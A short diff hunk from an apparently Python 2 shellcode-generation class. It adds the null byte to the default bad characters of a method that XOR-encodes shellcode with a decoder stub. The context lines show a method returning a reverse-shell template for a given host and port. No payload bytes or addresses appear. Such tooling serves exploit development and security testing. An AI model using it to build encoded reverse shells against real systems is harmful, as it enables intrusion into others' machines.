@@ -897,7 +897,7 @@ class Shellcode(object):
         p = struct.pack('>H', p)
         return self.get('reverse_shell', host=h, port=p)
 
-    def xor(self, code, badchars='\t\n\v\f\r '):
+    def xor(self, code, badchars='\x00\t\n\v\f\r '):
         for key in xrange(0x100):
             decoder = self.get('xor', key=chr(key))
             encoded_code = str(bytearray(c^key for c in bytearray(code)))
